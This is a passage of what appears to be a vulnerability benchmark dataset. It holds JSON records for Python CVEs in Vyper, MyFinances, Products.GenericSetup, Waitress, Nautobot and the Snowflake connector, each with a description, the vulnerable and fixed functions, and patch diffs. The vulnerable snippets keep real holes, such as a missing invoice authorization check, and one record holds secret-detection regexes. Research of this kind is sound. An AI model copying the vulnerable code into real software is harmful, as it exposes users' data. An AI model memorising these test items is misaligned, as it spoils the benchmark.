      {
        "id": "fix_py_415_2",
        "commit": "3d9c537142fb99b2672f21e2057f5f202cde194f",
        "file_path": "vyper/builtins/functions.py",
        "start_line": 865,
        "end_line": 909,
        "snippet": "    def build_IR(self, expr, args, kwargs, context):\n        bytez, index = args\n        ret_type = kwargs[\"output_type\"]\n\n        if potential_overlap(bytez, index):\n            raise CompilerPanic(\"risky overlap\")\n\n        def finalize(ret):\n            annotation = \"extract32\"\n            ret = IRnode.from_list(ret, typ=ret_type, annotation=annotation)\n            return clamp_basetype(ret)\n\n        with bytez.cache_when_complex(\"_sub\") as (b1, bytez):\n            # merge\n            length = get_bytearray_length(bytez)\n            index = clamp2(0, index, [\"sub\", length, 32], signed=True)\n            with index.cache_when_complex(\"_index\") as (b2, index):\n                assert not index.typ.is_signed\n\n                # \"easy\" case, byte- addressed locations:\n                if bytez.location.word_scale == 32:\n                    word = LOAD(add_ofst(bytes_data_ptr(bytez), index))\n                    return finalize(b1.resolve(b2.resolve(word)))\n\n                # storage and transient storage, word-addressed\n                assert bytez.location.word_scale == 1\n\n                slot = IRnode.from_list([\"div\", index, 32])\n                # byte offset within the slot\n                byte_ofst = IRnode.from_list([\"mod\", index, 32])\n\n                with byte_ofst.cache_when_complex(\"byte_ofst\") as (\n                    b3,\n                    byte_ofst,\n                ), slot.cache_when_complex(\"slot\") as (b4, slot):\n                    # perform two loads and merge\n                    w1 = LOAD(add_ofst(bytes_data_ptr(bytez), slot))\n                    w2 = LOAD(add_ofst(bytes_data_ptr(bytez), [\"add\", slot, 1]))\n\n                    left_bytes = shl([\"mul\", 8, byte_ofst], w1)\n                    right_bytes = shr([\"mul\", 8, [\"sub\", 32, byte_ofst]], w2)\n                    merged = [\"or\", left_bytes, right_bytes]\n\n                    ret = [\"if\", byte_ofst, merged, left_bytes]\n                    return finalize(b1.resolve(b2.resolve(b3.resolve(b4.resolve(ret)))))"
      }
    ],
    "vul_patch": "--- a/vyper/builtins/functions.py\n+++ b/vyper/builtins/functions.py\n@@ -11,6 +11,9 @@\n             # copy_bytes works on pointers.\n             assert is_bytes32, src\n             src = ensure_in_memory(src, context)\n+\n+        if potential_overlap(src, start) or potential_overlap(src, length):\n+            raise CompilerPanic(\"risky overlap\")\n \n         with src.cache_when_complex(\"src\") as (b1, src), start.cache_when_complex(\"start\") as (\n             b2,\n\n--- a/vyper/builtins/functions.py\n+++ b/vyper/builtins/functions.py\n@@ -1,6 +1,9 @@\n     def build_IR(self, expr, args, kwargs, context):\n         bytez, index = args\n         ret_type = kwargs[\"output_type\"]\n+\n+        if potential_overlap(bytez, index):\n+            raise CompilerPanic(\"risky overlap\")\n \n         def finalize(ret):\n             annotation = \"extract32\"\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-37889",
    "cve_description": "MyFinances is a web application for managing finances. MyFinances has a way to access other customer invoices while signed in as a user. This method allows an actor to access PII and financial information from another account. The vulnerability is fixed in 0.4.6.",
    "cwe_info": {
      "CWE-639": {
        "name": "Authorization Bypass Through User-Controlled Key",
        "description": "The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data."
      }
    },
    "repo": "https://github.com/TreyWW/MyFinances",
    "patch_url": [
      "https://github.com/TreyWW/MyFinances/commit/2c1e6d5b7ec8b2d6f660b260e3c5f4d3eaaa613f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_387_1",
        "commit": "a5e363c290328ea7ee8b107627163eb909094993",
        "file_path": "backend/views/core/invoices/edit.py",
        "start_line": 56,
        "end_line": 64,
        "snippet": "def invoice_edit_page_get(request, invoice_id):\n    try:\n        invoice = Invoice.objects.get(id=invoice_id)\n    except Invoice.DoesNotExist:\n        return JsonResponse({\"message\": \"Invoice not found\"}, status=404)\n\n    # use to populate fields with existing data in edit_from_destination.html AND edit_to_destination.html\n    data_to_populate = invoice_get_existing_data(invoice)\n    return render(request, \"pages/invoices/edit/edit.html\", data_to_populate)"
      },
      {
        "id": "vul_py_387_2",
        "commit": "a5e363c290328ea7ee8b107627163eb909094993",
        "file_path": "backend/views/core/invoices/edit.py",
        "start_line": 69,
        "end_line": 147,
        "snippet": "def edit_invoice(request: HtmxHttpRequest, invoice_id):\n    try:\n        invoice = Invoice.objects.get(id=invoice_id)\n    except Invoice.DoesNotExist:\n        return JsonResponse({\"message\": \"Invoice not found\"}, status=404)\n\n    if request.user.logged_in_as_team and request.user.logged_in_as_team != invoice.organization:\n        return JsonResponse(\n            {\"message\": \"You do not have permission to edit this invoice\"},\n            status=403,\n        )\n    elif request.user != invoice.user:\n        return JsonResponse(\n            {\"message\": \"You do not have permission to edit this invoice\"},\n            status=403,\n        )\n\n    attributes_to_updates = {\n        \"date_due\": datetime.strptime(request.POST.get(\"date_due\"), \"%Y-%m-%d\").date(),  # type: ignore[arg-type]\n        \"date_issued\": request.POST.get(\"date_issued\"),\n        \"self_name\": request.POST.get(\"from_name\"),\n        \"self_company\": request.POST.get(\"from_company\"),\n        \"self_address\": request.POST.get(\"from_address\"),\n        \"self_city\": request.POST.get(\"from_city\"),\n        \"self_county\": request.POST.get(\"from_county\"),\n        \"self_country\": request.POST.get(\"from_country\"),\n        \"notes\": request.POST.get(\"notes\"),\n        \"invoice_number\": request.POST.get(\"invoice_number\"),\n        \"vat_number\": request.POST.get(\"vat_number\"),\n        \"reference\": request.POST.get(\"reference\"),\n        \"sort_code\": request.POST.get(\"sort_code\"),\n        \"account_number\": request.POST.get(\"account_number\"),\n        \"account_holder_name\": request.POST.get(\"account_holder_name\"),\n    }\n\n    client_to_id = request.POST.get(\"selected_client\")\n    try:\n        client_to_obj = Client.objects.get(id=client_to_id, user=request.user)  # type: ignore[misc]\n    except (Client.DoesNotExist, ValueError):\n        client_to_obj = None\n\n    if client_to_obj:\n        invoice.client_to = client_to_obj\n    else:\n        attributes_to_updates.update(\n            {\n                \"client_name\": request.POST.get(\"to_name\"),\n                \"client_company\": request.POST.get(\"to_company\"),\n                \"client_address\": request.POST.get(\"to_address\"),\n                \"client_city\": request.POST.get(\"to_city\"),\n                \"client_county\": request.POST.get(\"to_county\"),\n                \"client_country\": request.POST.get(\"to_country\"),\n            }\n        )\n\n    for column_name, new_value in attributes_to_updates.items():\n        setattr(invoice, column_name, new_value)\n\n    invoice_items = [\n        InvoiceItem.objects.create(name=row[0], description=row[1], hours=row[2], price_per_hour=row[3])\n        for row in zip(\n            request.POST.getlist(\"service_name[]\"),\n            request.POST.getlist(\"service_description[]\"),\n            request.POST.getlist(\"hours[]\"),\n            request.POST.getlist(\"price_per_hour[]\"),\n        )\n    ]\n\n    if invoice_items:\n        invoice.items.set(invoice_items)\n\n    invoice.save()\n\n    messages.success(request, \"Invoice edited\")\n\n    if request.htmx:\n        return render(request, \"base/toasts.html\")\n\n    return invoice_edit_page_get(request, invoice_id)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_387_1",
        "commit": "2c1e6d5b7ec8b2d6f660b260e3c5f4d3eaaa613f",
        "file_path": "backend/views/core/invoices/edit.py",
        "start_line": 57,
        "end_line": 70,
        "snippet": "def invoice_edit_page_get(request, invoice_id):\n    try:\n        invoice = Invoice.objects.get(id=invoice_id)\n\n        if not invoice.has_access(request.user):\n            messages.error(request, \"You are not permitted to edit this invoice\")\n            return redirect(\"invoices:dashboard\")\n    except Invoice.DoesNotExist:\n        messages.error(request, \"Invoice not found\")\n        return redirect(\"invoices:dashboard\")\n\n    # use to populate fields with existing data in edit_from_destination.html AND edit_to_destination.html\n    data_to_populate = invoice_get_existing_data(invoice)\n    return render(request, \"pages/invoices/edit/edit.html\", data_to_populate)"
      },
      {
        "id": "fix_py_387_2",
        "commit": "2c1e6d5b7ec8b2d6f660b260e3c5f4d3eaaa613f",
        "file_path": "backend/views/core/invoices/edit.py",
        "start_line": 75,
        "end_line": 148,
        "snippet": "def edit_invoice(request: HtmxHttpRequest, invoice_id):\n    try:\n        invoice = Invoice.objects.get(id=invoice_id)\n    except Invoice.DoesNotExist:\n        return JsonResponse({\"message\": \"Invoice not found\"}, status=404)\n\n    if not invoice.has_access(request.user):\n        return JsonResponse(\n            {\"message\": \"You do not have permission to edit this invoice\"},\n            status=403,\n        )\n\n    attributes_to_updates = {\n        \"date_due\": datetime.strptime(request.POST.get(\"date_due\"), \"%Y-%m-%d\").date(),  # type: ignore[arg-type]\n        \"date_issued\": request.POST.get(\"date_issued\"),\n        \"self_name\": request.POST.get(\"from_name\"),\n        \"self_company\": request.POST.get(\"from_company\"),\n        \"self_address\": request.POST.get(\"from_address\"),\n        \"self_city\": request.POST.get(\"from_city\"),\n        \"self_county\": request.POST.get(\"from_county\"),\n        \"self_country\": request.POST.get(\"from_country\"),\n        \"notes\": request.POST.get(\"notes\"),\n        \"invoice_number\": request.POST.get(\"invoice_number\"),\n        \"vat_number\": request.POST.get(\"vat_number\"),\n        \"reference\": request.POST.get(\"reference\"),\n        \"sort_code\": request.POST.get(\"sort_code\"),\n        \"account_number\": request.POST.get(\"account_number\"),\n        \"account_holder_name\": request.POST.get(\"account_holder_name\"),\n    }\n\n    client_to_id = request.POST.get(\"selected_client\")\n    try:\n        client_to_obj = Client.objects.get(id=client_to_id, user=request.user)  # type: ignore[misc]\n    except (Client.DoesNotExist, ValueError):\n        client_to_obj = None\n\n    if client_to_obj:\n        invoice.client_to = client_to_obj\n    else:\n        attributes_to_updates.update(\n            {\n                \"client_name\": request.POST.get(\"to_name\"),\n                \"client_company\": request.POST.get(\"to_company\"),\n                \"client_address\": request.POST.get(\"to_address\"),\n                \"client_city\": request.POST.get(\"to_city\"),\n                \"client_county\": request.POST.get(\"to_county\"),\n                \"client_country\": request.POST.get(\"to_country\"),\n            }\n        )\n\n    for column_name, new_value in attributes_to_updates.items():\n        setattr(invoice, column_name, new_value)\n\n    invoice_items = [\n        InvoiceItem.objects.create(name=row[0], description=row[1], hours=row[2], price_per_hour=row[3])\n        for row in zip(\n            request.POST.getlist(\"service_name[]\"),\n            request.POST.getlist(\"service_description[]\"),\n            request.POST.getlist(\"hours[]\"),\n            request.POST.getlist(\"price_per_hour[]\"),\n        )\n    ]\n\n    if invoice_items:\n        invoice.items.set(invoice_items)\n\n    invoice.save()\n\n    messages.success(request, \"Invoice edited\")\n\n    if request.htmx:\n        return render(request, \"base/toasts.html\")\n\n    return invoice_edit_page_get(request, invoice_id)"
      }
    ],
    "vul_patch": "--- a/backend/views/core/invoices/edit.py\n+++ b/backend/views/core/invoices/edit.py\n@@ -1,8 +1,13 @@\n def invoice_edit_page_get(request, invoice_id):\n     try:\n         invoice = Invoice.objects.get(id=invoice_id)\n+\n+        if not invoice.has_access(request.user):\n+            messages.error(request, \"You are not permitted to edit this invoice\")\n+            return redirect(\"invoices:dashboard\")\n     except Invoice.DoesNotExist:\n-        return JsonResponse({\"message\": \"Invoice not found\"}, status=404)\n+        messages.error(request, \"Invoice not found\")\n+        return redirect(\"invoices:dashboard\")\n \n     # use to populate fields with existing data in edit_from_destination.html AND edit_to_destination.html\n     data_to_populate = invoice_get_existing_data(invoice)\n\n--- a/backend/views/core/invoices/edit.py\n+++ b/backend/views/core/invoices/edit.py\n@@ -4,12 +4,7 @@\n     except Invoice.DoesNotExist:\n         return JsonResponse({\"message\": \"Invoice not found\"}, status=404)\n \n-    if request.user.logged_in_as_team and request.user.logged_in_as_team != invoice.organization:\n-        return JsonResponse(\n-            {\"message\": \"You do not have permission to edit this invoice\"},\n-            status=403,\n-        )\n-    elif request.user != invoice.user:\n+    if not invoice.has_access(request.user):\n         return JsonResponse(\n             {\"message\": \"You do not have permission to edit this invoice\"},\n             status=403,\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-21360",
    "cve_description": "Products.GenericSetup is a mini-framework for expressing the configured state of a Zope Site as a set of filesystem artifacts. In Products.GenericSetup before version 2.1.1 there is an information disclosure vulnerability - anonymous visitors may view log and snapshot files generated by the Generic Setup Tool. The problem has been fixed in version 2.1.1. Depending on how you have installed Products.GenericSetup, you should change the buildout version pin to 2.1.1 and re-run the buildout, or if you used pip simply do pip install `\"Products.GenericSetup>=2.1.1\"`.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/zopefoundation/Products.GenericSetup",
    "patch_url": [
      "https://github.com/zopefoundation/Products.GenericSetup/commit/700319512b3615b3871a1f24e096cf66dc488c57"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_51_1",
        "commit": "835c1ac",
        "file_path": "src/Products/GenericSetup/context.py",
        "start_line": 482,
        "end_line": 501,
        "snippet": "    def writeDataFile(self, filename, text, content_type, subdir=None):\n        \"\"\" See IExportContext.\n        \"\"\"\n        if subdir is not None:\n            filename = '/'.join((subdir, filename))\n\n        sep = filename.rfind('/')\n        if sep != -1:\n            subdir = filename[:sep]\n            filename = filename[sep+1:]\n\n        if six.PY2 and isinstance(text, six.text_type):\n            encoding = self.getEncoding() or 'utf-8'\n            text = text.encode(encoding)\n\n        folder = self._ensureSnapshotsFolder(subdir)\n\n        # MISSING: switch on content_type\n        ob = self._createObjectByType(filename, text, content_type)\n        folder._setObject(str(filename), ob)  # No Unicode IDs!"
      },
      {
        "id": "vul_py_51_2",
        "commit": "835c1ac",
        "file_path": "src/Products/GenericSetup/context.py",
        "start_line": 547,
        "end_line": 565,
        "snippet": "    def _ensureSnapshotsFolder(self, subdir=None):\n        \"\"\" Ensure that the appropriate snapshot folder exists.\n        \"\"\"\n        path = ['snapshots', self._snapshot_id]\n\n        if subdir is not None:\n            path.extend(subdir.split('/'))\n\n        current = self._tool\n\n        for element in path:\n\n            if element not in current.objectIds():\n                # No Unicode IDs!\n                current._setObject(str(element), Folder(element))\n\n            current = current._getOb(element)\n\n        return current"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_51_1",
        "commit": "700319512b3615b3871a1f24e096cf66dc488c57",
        "file_path": "src/Products/GenericSetup/context.py",
        "start_line": 483,
        "end_line": 506,
        "snippet": "    def writeDataFile(self, filename, text, content_type, subdir=None):\n        \"\"\" See IExportContext.\n        \"\"\"\n        if subdir is not None:\n            filename = '/'.join((subdir, filename))\n\n        sep = filename.rfind('/')\n        if sep != -1:\n            subdir = filename[:sep]\n            filename = filename[sep+1:]\n\n        if six.PY2 and isinstance(text, six.text_type):\n            encoding = self.getEncoding() or 'utf-8'\n            text = text.encode(encoding)\n\n        folder = self._ensureSnapshotsFolder(subdir)\n\n        # MISSING: switch on content_type\n        ob = self._createObjectByType(filename, text, content_type)\n        folder._setObject(str(filename), ob)  # No Unicode IDs!\n        # Tighten the View permission on the new object.\n        # Only the owner and Manager users may view the log.\n        # file_ob = self._getOb(name)\n        ob.manage_permission(view, ('Manager', 'Owner'), 0)"
      },
      {
        "id": "fix_py_51_2",
        "commit": "700319512b3615b3871a1f24e096cf66dc488c57",
        "file_path": "src/Products/GenericSetup/context.py",
        "start_line": 552,
        "end_line": 572,
        "snippet": "    def _ensureSnapshotsFolder(self, subdir=None):\n        \"\"\" Ensure that the appropriate snapshot folder exists.\n        \"\"\"\n        path = ['snapshots', self._snapshot_id]\n\n        if subdir is not None:\n            path.extend(subdir.split('/'))\n\n        current = self._tool\n\n        for element in path:\n\n            if element not in current.objectIds():\n                # No Unicode IDs!\n                current._setObject(str(element), Folder(element))\n                current = current._getOb(element)\n                current.manage_permission(view, ('Manager', 'Owner'), 0)\n            else:\n                current = current._getOb(element)\n\n        return current"
      }
    ],
    "vul_patch": "--- a/src/Products/GenericSetup/context.py\n+++ b/src/Products/GenericSetup/context.py\n@@ -18,3 +18,7 @@\n         # MISSING: switch on content_type\n         ob = self._createObjectByType(filename, text, content_type)\n         folder._setObject(str(filename), ob)  # No Unicode IDs!\n+        # Tighten the View permission on the new object.\n+        # Only the owner and Manager users may view the log.\n+        # file_ob = self._getOb(name)\n+        ob.manage_permission(view, ('Manager', 'Owner'), 0)\n\n--- a/src/Products/GenericSetup/context.py\n+++ b/src/Products/GenericSetup/context.py\n@@ -13,7 +13,9 @@\n             if element not in current.objectIds():\n                 # No Unicode IDs!\n                 current._setObject(str(element), Folder(element))\n-\n-            current = current._getOb(element)\n+                current = current._getOb(element)\n+                current.manage_permission(view, ('Manager', 'Owner'), 0)\n+            else:\n+                current = current._getOb(element)\n \n         return current\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-21360:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/Products.GenericSetup\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2021-21360/bin/python -m pytest src/Products/GenericSetup/tests/test_tool.py::SetupToolTests::test_runAllImportStepsFromProfile_unicode_id_creates_reports src/Products/GenericSetup/tests/test_tool.py::SetupToolTests::test_createSnapshot_default -p no:warning --disable-warnings --import-mode=importlib\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-21360:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/Products.GenericSetup\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2021-21360/bin/python -m pytest src/Products/GenericSetup/tests/test_tool.py -p no:warning --disable-warnings --import-mode=importlib\n"
  },
  {
    "cve_id": "CVE-2024-49768",
    "cve_description": "Waitress is a Web Server Gateway Interface server for Python 2 and 3. A remote client may send a request that is exactly recv_bytes (defaults to 8192) long, followed by a secondary request using HTTP pipelining. When request lookahead is disabled (default) we won't read any more requests, and when the first request fails due to a parsing error, we simply close the connection. However when request lookahead is enabled, it is possible to process and receive the first request, start sending the error message back to the client while we read the next request and queue it. This will allow the secondary request to be serviced by the worker thread while the connection should be closed. Waitress 3.0.1 fixes the race condition. As a workaround, disable channel_request_lookahead, this is set to 0 by default disabling this feature.",
    "cwe_info": {
      "CWE-444": {
        "name": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')",
        "description": "The product acts as an intermediary HTTP agent\n         (such as a proxy or firewall) in the data flow between two\n         entities such as a client and server, but it does not\n         interpret malformed HTTP requests or responses in ways that\n         are consistent with how the messages will be processed by\n         those entities that are at the ultimate destination."
      }
    },
    "repo": "https://github.com/Pylons/waitress",
    "patch_url": [
      "https://github.com/Pylons/waitress/commit/e4359018537af376cf24bd13616d861e2fb76f65"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_104_1",
        "commit": "fdd2ecf",
        "file_path": "src/waitress/channel.py",
        "start_line": "189",
        "end_line": "234",
        "snippet": "    def received(self, data):\n        \"\"\"\n        Receives input asynchronously and assigns one or more requests to the\n        channel.\n        \"\"\"\n\n        if not data:\n            return False\n\n        with self.requests_lock:\n            while data:\n                if self.request is None:\n                    self.request = self.parser_class(self.adj)\n                n = self.request.received(data)\n\n                # if there are requests queued, we can not send the continue\n                # header yet since the responses need to be kept in order\n\n                if (\n                    self.request.expect_continue\n                    and self.request.headers_finished\n                    and not self.requests\n                    and not self.sent_continue\n                ):\n                    self.send_continue()\n\n                if self.request.completed:\n                    # The request (with the body) is ready to use.\n                    self.sent_continue = False\n\n                    if not self.request.empty:\n                        self.requests.append(self.request)\n\n                        if len(self.requests) == 1:\n                            # self.requests was empty before so the main thread\n                            # is in charge of starting the task. Otherwise,\n                            # service() will add a new task after each request\n                            # has been processed\n                            self.server.add_task(self)\n                    self.request = None\n\n                if n >= len(data):\n                    break\n                data = data[n:]\n\n        return True"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_104_1",
        "commit": "e435901",
        "file_path": "src/waitress/channel.py",
        "start_line": "189",
        "end_line": "243",
        "snippet": "    def received(self, data):\n        \"\"\"\n        Receives input asynchronously and assigns one or more requests to the\n        channel.\n        \"\"\"\n\n        if not data:\n            return False\n\n        with self.requests_lock:\n            # Don't bother processing anymore data if this connection is about\n            # to close. This may happen if readable() returned True, on the\n            # main thread before the service thread set the close_when_flushed\n            # flag, and we read data but our service thread is attempting to\n            # shut down the connection due to an error. We want to make sure we\n            # do this while holding the request_lock so that we can't race\n            if self.will_close or self.close_when_flushed:\n                return False\n\n            while data:\n                if self.request is None:\n                    self.request = self.parser_class(self.adj)\n                n = self.request.received(data)\n\n                # if there are requests queued, we can not send the continue\n                # header yet since the responses need to be kept in order\n\n                if (\n                    self.request.expect_continue\n                    and self.request.headers_finished\n                    and not self.requests\n                    and not self.sent_continue\n                ):\n                    self.send_continue()\n\n                if self.request.completed:\n                    # The request (with the body) is ready to use.\n                    self.sent_continue = False\n\n                    if not self.request.empty:\n                        self.requests.append(self.request)\n\n                        if len(self.requests) == 1:\n                            # self.requests was empty before so the main thread\n                            # is in charge of starting the task. Otherwise,\n                            # service() will add a new task after each request\n                            # has been processed\n                            self.server.add_task(self)\n                    self.request = None\n\n                if n >= len(data):\n                    break\n                data = data[n:]\n\n        return True"
      }
    ],
    "vul_patch": "--- a/src/waitress/channel.py\n+++ b/src/waitress/channel.py\n@@ -8,6 +8,15 @@\n             return False\n \n         with self.requests_lock:\n+            # Don't bother processing anymore data if this connection is about\n+            # to close. This may happen if readable() returned True, on the\n+            # main thread before the service thread set the close_when_flushed\n+            # flag, and we read data but our service thread is attempting to\n+            # shut down the connection due to an error. We want to make sure we\n+            # do this while holding the request_lock so that we can't race\n+            if self.will_close or self.close_when_flushed:\n+                return False\n+\n             while data:\n                 if self.request is None:\n                     self.request = self.parser_class(self.adj)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-46128",
    "cve_description": "Nautobot is a Network Automation Platform built as a web application atop the Django Python framework with a PostgreSQL or MySQL database. In Nautobot 2.0.x, certain REST API endpoints, in combination with the `?depth=<N>` query parameter, can expose hashed user passwords as stored in the database to any authenticated user with access to these endpoints. The passwords are not exposed in plaintext. This vulnerability has been patched in version 2.0.3.\n\n",
    "cwe_info": {
      "CWE-312": {
        "name": "Cleartext Storage of Sensitive Information",
        "description": "The product stores sensitive information in cleartext within a resource that might be accessible to another control sphere."
      }
    },
    "repo": "https://github.com/nautobot/nautobot",
    "patch_url": [
      "https://github.com/nautobot/nautobot/commit/1ce8e5c658a075c29554d517cd453675e5d40d71"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_101_1",
        "commit": "896c10c",
        "file_path": "nautobot/core/api/utils.py",
        "start_line": "301",
        "end_line": "330",
        "snippet": "def nested_serializer_factory(relation_info, nested_depth):\n    \"\"\"\n    Return a NestedSerializer representation of a serializer field.\n    This method should only be called in build_nested_field()\n    in which relation_info and nested_depth are already given.\n    \"\"\"\n    nested_serializer_name = f\"Nested{nested_depth}{relation_info.related_model.__name__}\"\n    # If we already have built a suitable NestedSerializer we return the cached serializer.\n    # else we build a new one and store it in the cache for future use.\n    if nested_serializer_name in NESTED_SERIALIZER_CACHE:\n        field_class = NESTED_SERIALIZER_CACHE[nested_serializer_name]\n        field_kwargs = get_nested_relation_kwargs(relation_info)\n    else:\n        base_serializer_class = get_serializer_for_model(relation_info.related_model)\n\n        class NautobotNestedSerializer(base_serializer_class):\n            class Meta:\n                model = relation_info.related_model\n                is_nested = True\n                depth = nested_depth - 1\n                if hasattr(base_serializer_class.Meta, \"fields\"):\n                    fields = base_serializer_class.Meta.fields\n                if hasattr(base_serializer_class.Meta, \"exclude\"):\n                    exclude = base_serializer_class.Meta.exclude\n\n        NautobotNestedSerializer.__name__ = nested_serializer_name\n        NESTED_SERIALIZER_CACHE[nested_serializer_name] = NautobotNestedSerializer\n        field_class = NautobotNestedSerializer\n        field_kwargs = get_nested_relation_kwargs(relation_info)\n    return field_class, field_kwargs"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_101_1",
        "commit": "1ce8e5c",
        "file_path": "nautobot/core/api/utils.py",
        "start_line": "301",
        "end_line": "325",
        "snippet": "def nested_serializer_factory(relation_info, nested_depth):\n    \"\"\"\n    Return a NestedSerializer representation of a serializer field.\n    This method should only be called in build_nested_field()\n    in which relation_info and nested_depth are already given.\n    \"\"\"\n    nested_serializer_name = f\"Nested{nested_depth}{relation_info.related_model.__name__}\"\n    # If we already have built a suitable NestedSerializer we return the cached serializer.\n    # else we build a new one and store it in the cache for future use.\n    if nested_serializer_name in NESTED_SERIALIZER_CACHE:\n        field_class = NESTED_SERIALIZER_CACHE[nested_serializer_name]\n        field_kwargs = get_nested_relation_kwargs(relation_info)\n    else:\n        base_serializer_class = get_serializer_for_model(relation_info.related_model)\n\n        class NautobotNestedSerializer(base_serializer_class):\n            class Meta(base_serializer_class.Meta):\n                is_nested = True\n                depth = nested_depth - 1\n\n        NautobotNestedSerializer.__name__ = nested_serializer_name\n        NESTED_SERIALIZER_CACHE[nested_serializer_name] = NautobotNestedSerializer\n        field_class = NautobotNestedSerializer\n        field_kwargs = get_nested_relation_kwargs(relation_info)\n    return field_class, field_kwargs"
      }
    ],
    "vul_patch": "--- a/nautobot/core/api/utils.py\n+++ b/nautobot/core/api/utils.py\n@@ -14,14 +14,9 @@\n         base_serializer_class = get_serializer_for_model(relation_info.related_model)\n \n         class NautobotNestedSerializer(base_serializer_class):\n-            class Meta:\n-                model = relation_info.related_model\n+            class Meta(base_serializer_class.Meta):\n                 is_nested = True\n                 depth = nested_depth - 1\n-                if hasattr(base_serializer_class.Meta, \"fields\"):\n-                    fields = base_serializer_class.Meta.fields\n-                if hasattr(base_serializer_class.Meta, \"exclude\"):\n-                    exclude = base_serializer_class.Meta.exclude\n \n         NautobotNestedSerializer.__name__ = nested_serializer_name\n         NESTED_SERIALIZER_CACHE[nested_serializer_name] = NautobotNestedSerializer\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-49750",
    "cve_description": "The Snowflake Connector for Python provides an interface for developing Python applications that can connect to Snowflake and perform all standard operations. Prior to version 3.12.3, when the logging level was set by the user to DEBUG, the Connector could have logged Duo passcodes (when specified via the `passcode` parameter) and Azure SAS tokens. Additionally, the SecretDetector logging formatter, if enabled, contained bugs which caused it to not fully redact JWT tokens and certain private key formats. Snowflake released version 3.12.3 of the Snowflake Connector for Python, which fixes the issue. In addition to upgrading, users should review their logs for any potentially sensitive information that may have been captured.",
    "cwe_info": {
      "CWE-532": {
        "name": "Insertion of Sensitive Information into Log File",
        "description": "The product writes sensitive information to a log file."
      }
    },
    "repo": "https://github.com/snowflakedb/snowflake-connector-python",
    "patch_url": [
      "https://github.com/snowflakedb/snowflake-connector-python/commit/dbc9284a3c0382c131b971b35e8d6ab93c46f37a"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_69_1",
        "commit": "7ddbf3175f05e0ec1410487938d6eed2f73539a8",
        "file_path": "src/snowflake/connector/secret_detector.py",
        "start_line": 22,
        "end_line": 53,
        "snippet": "class SecretDetector(logging.Formatter):\n    AWS_KEY_PATTERN = re.compile(\n        r\"(aws_key_id|aws_secret_key|access_key_id|secret_access_key)\\s*=\\s*'([^']+)'\",\n        flags=re.IGNORECASE,\n    )\n    AWS_TOKEN_PATTERN = re.compile(\n        r'(accessToken|tempToken|keySecret)\"\\s*:\\s*\"([a-z0-9/+]{32,}={0,2})\"',\n        flags=re.IGNORECASE,\n    )\n    SAS_TOKEN_PATTERN = re.compile(\n        r\"(sig|signature|AWSAccessKeyId|password|passcode)=(?P<secret>[a-z0-9%/+]{16,})\",\n        flags=re.IGNORECASE,\n    )\n    PRIVATE_KEY_PATTERN = re.compile(\n        r\"-----BEGIN PRIVATE KEY-----\\\\n([a-z0-9/+=\\\\n]{32,})\\\\n-----END PRIVATE KEY-----\",\n        flags=re.MULTILINE | re.IGNORECASE,\n    )\n    PRIVATE_KEY_DATA_PATTERN = re.compile(\n        r'\"privateKeyData\": \"([a-z0-9/+=\\\\n]{10,})\"', flags=re.MULTILINE | re.IGNORECASE\n    )\n    CONNECTION_TOKEN_PATTERN = re.compile(\n        r\"(token|assertion content)\" r\"([\\'\\\"\\s:=]+)\" r\"([a-z0-9=/_\\-\\+]{8,})\",\n        flags=re.IGNORECASE,\n    )\n\n    PASSWORD_PATTERN = re.compile(\n        r\"(password\"\n        r\"|pwd)\"\n        r\"([\\'\\\"\\s:=]+)\"\n        r\"([a-z0-9!\\\"#\\$%&\\\\\\'\\(\\)\\*\\+\\,-\\./:;<=>\\?\\@\\[\\]\\^_`\\{\\|\\}~]{1,})\",\n        flags=re.IGNORECASE,\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_69_1",
        "commit": "dbc9284a3c0382c131b971b35e8d6ab93c46f37a",
        "file_path": "src/snowflake/connector/secret_detector.py",
        "start_line": 22,
        "end_line": 53,
